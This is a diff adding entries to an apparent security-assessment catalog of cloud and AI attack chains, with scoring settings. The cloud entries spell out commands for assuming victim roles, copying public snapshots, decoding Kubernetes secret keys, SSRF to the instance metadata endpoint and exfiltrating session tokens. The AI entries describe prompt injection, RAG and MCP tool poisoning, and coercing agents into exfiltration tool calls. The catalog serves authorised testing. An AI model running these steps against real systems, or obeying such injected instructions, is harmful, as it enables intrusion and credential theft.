+      - "Discover role ARN via misconfigured trust (e.g. via metadata leak, public S3 bucket policy referencing role, or enum_iam_policies output)"
+      - "Inspect trust policy: aws iam get-role --role-name <role> | jq .Role.AssumeRolePolicyDocument"
+      - "Identify confused deputy: Principal: '*' OR no sts:ExternalId condition OR wildcard sts:* on trust"
+      - "Assume from attacker account: aws sts assume-role --role-arn <victim-role> --role-session-name pwn"
+      - "Use returned credentials: aws s3 ls / aws dynamodb list-tables in victim account"
+      - "Download sample sensitive object as proof of cross-account access"
+    conditions: "Cross-account IAM role with wildcard principal OR no external ID condition OR overpermissive sts:AssumeRole policy"
+
+  - id: CHAIN-36
+    name: "Public Snapshot to Data Extraction to Credential Harvest"
+    description: "Public RDS/EBS/Disk snapshot is copied to attacker-controlled account, mounted, and yields cleartext database admin credentials, application secrets, or master keys."
+    steps:
+      - vuln: public_storage
+        grants: [cloud_storage_read]
+      - action: "copy and mount public snapshot"
+        requires: [cloud_storage_read]
+        grants: [data_exfiltration, credential_theft]
+      - vuln: iam_privesc
+        requires: [credential_theft]
+        grants: [admin_session, cloud_secrets_read]
+    severity_combined: critical
+    test_steps:
+      - "Enumerate public snapshots: aws ec2 describe-snapshots --restorable-by-user-ids all --owner-ids <victim> OR aws rds describe-db-snapshots --include-public"
+      - "Copy to attacker account: aws ec2 copy-snapshot --source-snapshot-id <snap> --source-region <r> --destination-region <r>"
+      - "For EBS: create volume from snapshot, attach to attacker EC2, mount, search for credentials"
+      - "For RDS: aws rds restore-db-instance-from-db-snapshot --db-instance-identifier pwn --db-snapshot-identifier <snap> then connect as master"
+      - "Search for cleartext: grep -r -E 'password|secret|api_key' /mnt/snapshot/ 2>/dev/null"
+      - "Test discovered credentials against production services as proof of impact"
+    conditions: "RDS/EBS/Azure Disk/GCP snapshot has public visibility OR IsPublic=true OR shared with all AWS accounts"
+
+  - id: CHAIN-37
+    name: "K8s Secret Read to Cloud Service Account Key to Storage Exfiltration"
+    description: "Overprivileged Kubernetes RBAC allows reading Secret resources across namespaces. Secrets contain cloud service account JSON keys which grant access to cloud storage."
+    steps:
+      - vuln: k8s_rbac_abuse
+        grants: [k8s_cluster_access, cloud_secrets_read]
+      - action: "extract cloud SA key from K8s secret"
+        requires: [cloud_secrets_read]
+        grants: [cloud_credential_harvest]
+      - action: "use SA key for cloud storage access"
+        requires: [cloud_credential_harvest]
+        grants: [cloud_storage_read, data_exfiltration]
+    severity_combined: high
+    test_steps:
+      - "Verify access: kubectl auth can-i list secrets --all-namespaces"
+      - "Enumerate: kubectl get secrets --all-namespaces -o json"
+      - "Identify cloud SA keys: kubectl get secrets -A -o json | jq '.items[] | select(.data | tostring | contains(\"service-account\") or contains(\"BEGIN PRIVATE KEY\"))'"
+      - "Decode: kubectl get secret <name> -n <ns> -o jsonpath='{.data.key\\.json}' | base64 -d > sa.json"
+      - "Activate: gcloud auth activate-service-account --key-file=sa.json (or aws configure import for AWS access keys)"
+      - "Confirm storage access: gsutil ls / aws s3 ls and download a sample sensitive object"
+    conditions: "K8s RBAC permits cross-namespace secret reads + secrets store cloud service account keys (common with Workload Identity not yet adopted)"
+
+  - id: CHAIN-38
+    name: "API Gateway Auth Bypass to Direct Lambda to SSRF to IMDS Credential Harvest"
+    description: "Missing API Gateway authorizer enables direct Lambda invocation. The Lambda function makes outbound HTTP requests with user-controlled URL parameters, enabling SSRF to the IMDS endpoint."
+    steps:
+      - vuln: lambda_injection
+        grants: [serverless_invocation]
+      - vuln: ssrf
+        requires: [serverless_invocation]
+        grants: [ssrf_request, cloud_metadata_access]
+      - vuln: cloud_metadata_exposure
+        requires: [cloud_metadata_access]
+        grants: [cloud_credential_harvest, iam_admin_access]
+    severity_combined: critical
+    test_steps:
+      - "Identify Lambda function URL or function name via reconnaissance (cloudfront origin, exposed function URL, IAM enum)"
+      - "Confirm direct invoke works: aws lambda invoke --function-name <fn> --payload '{}' out.json (no auth header)"
+      - "Identify URL parameter the Lambda fetches (inspect function code via aws lambda get-function or trigger error message that reveals parameter handling)"
+      - "Submit payload with url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "Read returned IAM credentials from Lambda response"
+      - "Validate harvested keys against AWS API as proof of escalation"
+    conditions: "API Gateway route lacks authorizer OR Lambda function URL has AuthType=NONE + Lambda fetches user-controlled URLs without IMDS blocklist + IMDSv1 enabled in Lambda execution context"
+
+  - id: CHAIN-39
+    name: "Stale Access Key to Secrets Manager to Database Takeover"
+    description: "Unrotated AWS access key from git history is still active. The key has secretsmanager:GetSecretValue, which yields the RDS master password. Database is reached via VPC peering or public endpoint."
+    steps:
+      - vuln: exposed_secrets
+        grants: [credential_theft]
+      - action: "validate stale access key"
+        requires: [credential_theft]
+        grants: [cloud_credential_harvest]
+      - action: "read RDS password from Secrets Manager"
+        requires: [cloud_credential_harvest]
+        grants: [cloud_secrets_read, admin_session]
+      - action: "connect to database with master credentials"
+        requires: [admin_session]
+        grants: [data_exfiltration]
+    severity_combined: critical
+    test_steps:
+      - "Extract access keys from git history: gitleaks detect --source <repo> --report-format json"
+      - "Test each key: aws sts get-caller-identity --access-key-id <id> --secret-access-key <secret>"
+      - "Enumerate permissions of valid keys: enum_iam_policies on principal"
+      - "Read secrets: aws secretsmanager list-secrets and aws secretsmanager get-secret-value --secret-id <arn>"
+      - "Identify RDS endpoint from secret JSON or aws rds describe-db-instances"
+      - "Connect: psql / mysql with extracted master credentials, run SELECT current_user; as proof"
+    conditions: "Access keys leaked in git history + organization has not rotated keys + keys retain secretsmanager:GetSecretValue + RDS endpoint is reachable from attacker context"
+
+  - id: CHAIN-40
+    name: "Public SQS Queue to Lambda Trigger to Command Injection"
+    description: "Publicly writable SQS queue is processed by a Lambda function. Crafted message exploits a command injection or unsafe deserialization sink in the Lambda handler, achieving RCE in serverless context."
+    steps:
+      - vuln: api_abuse
+        grants: [api_abuse]
+      - vuln: lambda_injection
+        requires: [api_abuse]
+        grants: [serverless_invocation, command_execution]
+      - action: "exfiltrate Lambda execution role credentials"
+        requires: [command_execution]
+        grants: [cloud_credential_harvest, iam_admin_access]
+    severity_combined: critical
+    test_steps:
+      - "Discover SQS queue URL via cloud asset enumeration (enum_cloud_account or aws sqs list-queues)"
+      - "Check queue policy: aws sqs get-queue-attributes --queue-url <url> --attribute-names Policy and look for Principal: '*' on SendMessage"
+      - "Identify consuming Lambda: aws lambda list-event-source-mappings --event-source-arn <queue-arn>"
+      - "Inspect Lambda handler (aws lambda get-function) to find injection sink in message processing"
+      - "Send crafted message: aws sqs send-message --queue-url <url> --message-body '<injection-payload>'"
+      - "Verify RCE via OOB callback (DNS or HTTP) and exfiltrate AWS_SESSION_TOKEN from Lambda env"
+    conditions: "SQS queue policy permits SendMessage from external principals + consuming Lambda processes message body unsafely (eval, exec, shell, or unsafe deserialization)"
+
+  # ---------------------------------------------------------------------------
+  # AI / LLM chains (CHAIN-51 → CHAIN-60) — ai_targets scope only.
+  # The canonical AI chain bridges untrusted input → model action → real impact.
+  # An AI step's "exploited" status is its success-rate vs the test's
+  # fail_threshold; a captured-not-executed tool call is still a confirmed step
+  # (capability-not-execution, AI Safety Mandate §10.3).
+  # ---------------------------------------------------------------------------
+
+  - id: CHAIN-51
+    name: "Indirect Injection to Tool Exfiltration"
+    description: "Attacker-controlled content in a retrieved doc / tool output coerces a tool-using agent into calling an exfil/egress tool"
+    steps:
+      - vuln: ai_indirect_prompt_injection
+        grants: [model_instruction_control]
+      - vuln: ai_excessive_agency
+        requires: [model_instruction_control]
+        grants: [agent_tool_invocation]
+    severity_combined: critical
+    test_steps:
+      - "ai-recon maps an untrusted-input entry point that reaches the context (retrieved doc / tool output / fetched URL)"
+      - "ai-redteam seeds an indirect-injection payload at that source (AI-PI-02), success-rate k/N"
+      - "Injected instruction coerces the agent to call a high-side-effect tool (AI-EA-01); CAPTURE the tool call + args, do NOT execute"
+      - "Chain confirmed: untrusted input → tool call with attacker-chosen arguments"
+    conditions: "An agent target with an untrusted-input path into context AND a reachable high-side-effect tool"
+
+  - id: CHAIN-52
+    name: "Prompt Injection to Stored XSS (cross-surface)"
+    description: "Model output containing an active payload is rendered unsanitized by the app UI — AI injection becomes a web XSS in one /assess run"
+    steps:
+      - vuln: ai_prompt_injection
+        grants: [model_instruction_control, model_output_control]
+      - vuln: ai_improper_output_handling
+        requires: [model_output_control]
+        grants: [javascript_execution]
+    severity_combined: high
+    test_steps:
+      - "ai-redteam drives the model to emit a tagged active markdown/HTML payload (AI-OH-01/AI-OH-02)"
+      - "ai-redteam renders the output through the real UI sink (browser) and confirms script execution"
+      - "This is the cross-surface bridge — the AI injection grant composes with the web javascript_execution sink"
+    conditions: "Model output is rendered as HTML/markdown by a downstream component without sanitization"
+
+  - id: CHAIN-53
+    name: "RAG Poisoning to Answer Steering"
+    description: "Attacker content placed in the retrieval corpus steers later answers (non-persistent probe)"
+    steps:
+      - vuln: ai_rag_poisoning
+        grants: [rag_retrieval_influence]
+      - vuln: ai_prompt_injection
+        requires: [rag_retrieval_influence]
+        grants: [model_instruction_control]
+    severity_combined: high
+    test_steps:
+      - "ai-redteam confirms attacker-controlled content is retrievable into context (AI-POI-01, non-persistent)"
+      - "Retrieved content carries an instruction the model follows (success-rate k/N)"
+      - "NEVER write to the customer's production index (AI Safety Mandate §10.2)"
+    conditions: "A rag_app whose retrieval ingests attacker-influenceable content"
+
+  - id: CHAIN-54
+    name: "MCP Tool-Description Poisoning to Confused Deputy"
+    description: "A customer MCP server's poisoned tool description injects the connecting client, escalating to a confused-deputy tool call"
+    steps:
+      - vuln: ai_mcp_tool_poisoning
+        grants: [model_instruction_control]
+      - vuln: ai_mcp_confused_deputy
+        requires: [model_instruction_control]
+        grants: [agent_tool_invocation]
+    severity_combined: critical
+    test_steps:
+      - "ai-redteam inspects tools/list and finds instruction-bearing tool descriptions (AI-MCP-01)"
+      - "Description text steers the client into a privileged tool call run with the server's authority (AI-MCP-02)"
+      - "CAPTURE the call; do NOT execute"
+    conditions: "An mcp_server target whose tool descriptions enter the client context AND a higher-privilege tool exists"
+
+  - id: CHAIN-55
+    name: "System-Prompt Leak to Targeted Excessive Agency"
+    description: "Extracted system prompt / tool schema reveals the exact tools to coerce, enabling a precise excessive-agency abuse"
+    steps:
+      - vuln: ai_system_prompt_leak
+        grants: [system_prompt_disclosure]
+      - vuln: ai_excessive_agency
+        requires: [system_prompt_disclosure]
+        grants: [agent_tool_invocation]
+    severity_combined: high
+    test_steps:
+      - "ai-redteam extracts the system prompt + tool schema (AI-SPL-01/AI-SPL-02)"
+      - "Disclosed tool names/args inform a precise tool-call coercion (AI-EA-01); CAPTURE the call"
+    conditions: "The model leaks its tool schema AND exposes callable tools"
+
+  # --- Cross-surface bridges: AI agent tool call → cloud / identity (the full
+  #     kill chain). These connect agent_tool_invocation (where CHAIN-51/55 stop)
+  #     to the existing cloud/identity capabilities, so an AI injection composes
+  #     with the cloud privesc chains (CHAIN-30s) in one /assess run. The captured
+  #     tool call is the confirmed step (capability-not-execution, §10.3) — the
+  #     downstream cloud/identity step is then walked with the harvested capability.
+  - id: CHAIN-56
+    name: "Excessive Agency to Cloud Credential Harvest"
+    description: "A coerced agent tool call reads cloud credentials / secrets / instance metadata, bridging the AI surface into the cloud privilege-escalation chains"
+    steps:
+      - vuln: ai_excessive_agency
+        grants: [agent_tool_invocation]
+      - vuln: ai_agent_cloud_credential_read
+        requires: [agent_tool_invocation]
+        grants: [cloud_credential_harvest, cloud_secrets_read]
+    severity_combined: critical
+    test_steps:
+      - "ai-redteam coerces the agent to call a tool that reaches cloud creds/secrets/metadata (AI-EA-01/02); CAPTURE the tool call + args, do NOT execute"
+      - "The harvested capability feeds the cloud chains — e.g. cloud_credential_harvest → iam_admin_access (CHAIN-30s); chain-analysis composes them"
+      - "Confirmed: AI injection → agent tool call → cloud credential harvest → cloud privesc"
+    conditions: "An agent target whose tool set can read cloud credentials/secrets/metadata AND cloud_accounts in scope for the downstream chain"
+
+  - id: CHAIN-57
+    name: "Excessive Agency to Privilege Escalation / Exfiltration"
+    description: "A coerced agent tool call escalates privilege or exfiltrates data directly — the identity/lateral analog of CHAIN-56"
+    steps:
+      - vuln: ai_excessive_agency
+        grants: [agent_tool_invocation]
+      - vuln: ai_agent_privileged_action
+        requires: [agent_tool_invocation]
+        grants: [privilege_escalation, data_exfiltration]
+    severity_combined: high
+    test_steps:
+      - "ai-redteam coerces the agent into a privileged/exfil tool call beyond its intended scope (AI-EA-01/02); CAPTURE the call, do NOT execute"
+      - "The captured call demonstrates the agent WOULD escalate/exfiltrate — capability-not-execution is the proof (§10.3)"
+      - "Confirmed: AI injection → agent tool call → privilege escalation or data exfiltration"
+    conditions: "An agent target whose tool set can perform a privileged action or move data out of its intended boundary"
+
+# =============================================================================
+# SCORING CONFIGURATION
+# =============================================================================
+scoring:
+
+  # Base confidence for different match types
+  confidence_base:
+    catalog_match: 0.60
+    emergent_discovery: 0.40
+
+  # Confidence adjustments
+  confidence_adjustments:
+    same_host: 0.15          # Both findings on same host
+    same_session: 0.10       # Both from same scan session
+    cross_host: -0.20        # Findings on different hosts
+    unproven_auth: -0.15     # Chain requires auth not yet demonstrated
+    exploit_confirmed: 0.25  # Exploit agent confirmed the chain
+    exploit_refuted: -0.30   # Exploit agent showed chain is blocked
+
+  # Severity calculation
+  severity_rules:
+    method: "highest_step_plus_bonus"
+    chain_bonus: 1           # Add 1 severity level for confirmed chains
+    max_severity: "critical" # Cap at critical
+    # Severity order: info(0) < low(1) < medium(2) < high(3) < critical(4)
+    severity_order:
+      info: 0
+      low: 1
+      medium: 2
+      high: 3
+      critical: 4
